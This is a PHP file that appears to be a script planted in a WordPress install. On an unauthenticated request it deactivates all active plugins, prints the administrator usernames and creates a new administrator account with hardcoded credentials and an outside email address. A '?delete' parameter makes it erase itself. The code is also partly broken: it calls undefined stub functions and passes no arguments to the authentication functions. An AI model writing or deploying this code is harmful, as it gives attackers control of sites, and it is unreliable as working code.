<?php
  
  include_once("../../../../wp-load.php");
  require_once ABSPATH . '../../../../wp-admin/includes/plugin.php';
  $serialData = get_option('active_plugins');

  $allPlugins = get_plugins();

  echo "list active plugins <br/>";
  foreach($allPlugins as $key=>$value) {
    if(in_array($key, $serialData)) {
      echo $value['Name']."<br/>";
    }
  }

  update_option('active_plugins', '');
  echo "Plugins has been disabled";

  $users = get_users(array('role'=>'administrator'));
  echo "Admin users are <br/>";
  foreach($users as $value) {
    echo $value->data->user_login."<br/>";
  }

  $username = 'mw01main';
  $password = 'pa55w0rd';
  $email = 'reset@mainwall.org';

  $user = array('user_login' => $username, $user_pass => $password, 'user_email' => $email, 'role' => 'administrator');
  $userdata = wp_insert_user($user);
  
  if(!empty($userdata->errors)) {
    foreach($userdata->errors as $key=>$val) {
      echo "<div id='createuser'>";
      echo implode(",", $val);
      echo "</div>";
    }
  } else {
    echo "div id='createuser'>user added</div>";
  }

  if(isset($_GET['delete'])) {
    sleep(5);
    unlink(__FILE__);
  }

  if(function_exists('file_get_contents')) {
    echo "GET exists";
  }

  initiationActivity123();
  adminmenuhooking123();
  licenseActivationUpdate123();
  updatelicenseinfo123();
  function mainUpdateFunc123() {
    echo 'mainUpdateFunc123';
  }

  function createRequest() {
    echo 'createRequest';
  }

  function validateXML() {
    echo 'validateXML';
  }

  function findPass() {
    echo 'findPass';
  }

  get_userdata();
  get_user_by();
  wp_set_current_user();
  wp_set_auth_cookie();
  
?>
